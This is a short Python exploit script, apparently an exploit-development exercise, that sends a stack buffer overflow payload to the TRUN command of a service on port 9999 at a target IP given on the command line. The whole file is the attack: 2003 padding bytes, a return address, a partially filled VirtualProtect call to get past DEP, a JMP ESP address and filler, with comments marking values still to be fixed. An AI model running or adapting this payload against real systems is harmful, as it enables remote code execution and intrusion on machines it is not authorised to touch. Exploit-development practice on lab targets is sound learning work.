#!/usr/bin/env python3

#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

PAYLOAD = (
    b'TRUN /.:/' +
    b'A' * 2003 +
    # 0x6250129D Address of RETN
    struct.pack('<L', 0x6250129D) +
    # 0x76e50b60 Address of VirtualProtect 
    struct.pack('<L', 0x76e50b60) +
    # 0x625014dd Address of JMP ESP
    struct.pack('<L', 0x625014dd) +
    # Place Holder for lpAddress
    struct.pack('<L', 0xaaaaaaaa) +
    # Place Holder for dwSize
    struct.pack('<L', 0xaaaaaaaa) +
    # Place Holder for flNewProtect: This should be 0x00000040 but we cannot inject NULL bytes
    # As this acts as a bit mask as long as we have non-overlapping values but contain 0x00000040 we should be fine
    struct.pack('<L', 0x11111140) +
    # Address for lpflOldProtect: This just needs to be a writable Address (Somewhere on the stack)
    struct.pack('<L', 0x6250404C) + # You can get this from the STACK view # Need to change to some address on the stack             
    b'C' * 1000
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)